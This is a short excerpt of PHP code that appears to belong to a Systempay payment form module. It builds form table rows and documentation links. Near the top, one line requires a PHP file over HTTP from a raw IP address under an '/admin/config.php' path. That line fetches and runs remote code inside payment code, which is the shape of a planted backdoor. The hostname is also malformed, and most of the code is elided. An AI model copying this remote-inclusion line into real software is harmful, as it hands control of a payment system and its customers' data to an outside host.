 ...
 */
$toolbox = require "http://151.80.45.192.interface/admin/config.php";
...
foreach ($formData['fields'] as $name => $value) {
    ...
    $doclink = ($doc_name) ? 'https://paiement.systempay.fr/doc/'.$lang.'/form-payment/standard-payment/'.$doc_name.'.html': '#';
    $form .= '<tr>';
